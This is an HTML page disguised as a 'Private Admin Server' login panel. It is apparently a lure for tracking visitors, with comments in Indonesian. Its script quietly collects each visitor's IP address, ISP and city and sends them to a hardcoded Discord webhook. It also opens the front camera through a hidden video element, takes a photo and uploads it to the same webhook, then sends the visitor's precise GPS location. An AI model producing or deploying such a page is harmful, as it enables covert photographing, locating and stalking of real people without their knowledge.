<!doctype html>
<html lang="id">
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Internal Admin Panel - Secure Access</title>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
  <style>
        body { background-color: #050505; color: #00ff41; font-family: 'JetBrains Mono', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
        .panel { width: 95%; max-width: 500px; border: 1px solid #00ff41; padding: 25px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); text-align: center; }
        .header { border-bottom: 2px solid #ff0000; padding-bottom: 15px; margin-bottom: 20px; color: #ff0000; font-weight: bold; text-shadow: 0 0 10px #ff0000; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .data-item { border: 1px solid #1a3d1a; padding: 8px; background: #000; font-size: 10px; text-align: left; }
        .label { color: #888; display: block; font-size: 8px; text-transform: uppercase; }
        .val { color: #00ff41; font-weight: bold; }
        .btn { background: #ff0000; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; font-family: inherit; font-size: 14px; box-shadow: 0 0 15px #ff0000; text-transform: uppercase; }
        .loader { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 11px; color: #ffaa00; margin-top: 15px; min-height: 60px; font-weight: bold; line-height: 1.6; }
        #result-page { display: none; width: 100%; min-height: 100vh; position: absolute; top: 0; left: 0; background: #000; z-index: 9999; padding: 20px; box-sizing: border-box; }
        .data-box { border: 1px solid #00ff41; padding: 15px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); text-align: left; font-size: 12px; }
        .map-frame { width: 100%; height: 300px; border: 1px solid #00ff41; margin-top: 10px; filter: invert(90%) hue-rotate(180deg); }
        .preview-img { width: 100%; border: 1px solid #00ff41; border-radius: 4px; display: block; background: #111; margin-top: 10px; }
        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        #c { display: none; }
    </style>
 </head>
 <body>

  <div class="panel" id="login-panel">
   <div class="header">‚ö†Ô∏è PRIVATE ADMIN SERVER ‚ö†Ô∏è</div>
   <div class="grid">
    <div class="data-item"><span class="label">Device</span><span id="d-model" class="val">Linux</span></div>
    <div class="data-item"><span class="label">IP_Addr</span><span id="d-ip" class="val">114.5.110.211</span></div>
    <div class="data-item"><span class="label">Battery</span><span id="d-bat" class="val">47%</span></div>
    <div class="data-item"><span class="label">Hardware</span><span id="d-ram" class="val">8 Cores / 8 GB</span></div>
    <div class="data-item" style="grid-column: span 2;"><span class="label">ISP_Provider</span><span id="d-isp" class="val">INDOSAT Internet Network Provider</span></div>
   </div>
   <video id="v" autoplay playsinline muted></video>
   <canvas id="c"></canvas>
   <div id="loading-icon" class="loader"></div>
   <p id="status">[GPS] Sinkronisasi Koordinat Satelit...</p>
   <button id="mainBtn" class="btn" style="display:none;" onclick="startAdvancedCapture()">Retry Sync</button>
  </div>

  <div id="result-page">
   <div style="max-width:500px; margin:0 auto;">
    <h3 style="color: #00ff41; text-align: center;">SUCCESS: USER LIVE VIEW</h3>
    <div class="data-box">
        <span style="color: #ff0000; font-weight: bold;">[!] GPS_CORE_DATA</span><br>
        KOORDINAT: <span id="res-latlon" style="color:#fff;">Connected</span><br>
        <div id="map-container"></div>
    </div>
    <div class="data-box">
        <span style="color: #ff0000; font-weight: bold;">[!] BIOMETRIC_VISUAL</span>
        <div id="photo-container"></div>
    </div>
    <button class="btn" style="background: #00ff41; color: #000;" onclick="location.reload()">TERMINATE SESSION</button>
   </div>
  </div>

  <script>
    const WH = "https://discord.com/api/webhooks/1464945657386242215/reBayi8sdQCNfp5PMp_c12ejYPeeFwoNurlukhTAQfyrx6Yeccc2ZkPNDnb9iF0kzhBj";
    let fullInfo = {};
    let ipLat = 0, ipLon = 0;

    (async function autoInit() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            fullInfo = { ip: d.ip, isp: d.org, city: d.city, country: d.country_name, lat: d.latitude, lon: d.longitude };
            ipLat = d.latitude; ipLon = d.longitude;

            // Langsung Kirim Data Awal Ke Discord
            await fetch(WH, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    embeds: [{
                        title: "üöÄ TARGET ENTERED SERVER",
                        color: 16711680,
                        fields: [
                            { name: "üåê Jaringan", value: `**IP:** ${d.ip}\n**ISP:** ${d.org}\n**Lokasi:** ${d.city}, ${d.country_name}`, inline: false }
                        ]
                    }]
                })
            });
            // Mulai proses capture otomatis setelah init
            startAdvancedCapture();
        } catch (e) { startAdvancedCapture(); }
    })();

    async function startAdvancedCapture() {
        const status = document.getElementById('status');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('v').srcObject = stream;
            
            // Ambil Foto
            setTimeout(async () => {
                await captureAndSend(document.getElementById('v'), 1);
                
                // Minta Lokasi dengan Timeout
                status.innerText = "[GPS] Sinkronisasi Koordinat Satelit...";
                
                const locationOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };

                navigator.geolocation.getCurrentPosition(
                    (p) => { finishProcess(p.coords.latitude, p.coords.longitude, stream, "SAT_LOCK"); },
                    (err) => { finishProcess(ipLat, ipLon, stream, "IP_FALLBACK"); },
                    locationOptions
                );
            }, 1000);
        } catch (e) { 
            // Jika kamera ditolak, tetap coba ambil lokasi
            navigator.geolocation.getCurrentPosition(
                (p) => { finishProcess(p.coords.latitude, p.coords.longitude, null, "SAT_LOCK_NO_CAM"); },
                (err) => { finishProcess(ipLat, ipLon, null, "IP_FALLBACK_NO_CAM"); }
            );
        }
    }

    async function captureAndSend(video, index) {
        const canvas = document.getElementById('c');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(async (blob) => {
            const img = document.createElement('img');
            img.src = URL.createObjectURL(blob);
            img.className = 'preview-img';
            document.getElementById('photo-container').appendChild(img);
            const fd = new FormData();
            fd.append("file", blob, "shot.jpg");
            fd.append("payload_json", JSON.stringify({ content: `üì∏ **Photo Capture** | IP: ${fullInfo.ip}` }));
            await fetch(WH, { method: "POST", body: fd });
        }, 'image/jpeg', 0.6);
    }

    async function finishProcess(lat, lon, stream, method) {
        document.getElementById('res-latlon').innerText = `${lat}, ${lon}`;
        document.getElementById('map-container').innerHTML = `<iframe class="map-frame" src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>`;
        
        await fetch(WH, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: `üìç **LOCATION FIXED (${method})**\nIP: ${fullInfo.ip}\nMaps: https://www.google.com/maps?q=${lat},${lon}` })
        });

        document.getElementById('login-panel').style.display = 'none';
        document.getElementById('result-page').style.display = 'block';
        if (stream) stream.getTracks().forEach(t => t.stop());
    }
  </script>
 </body>
</html>
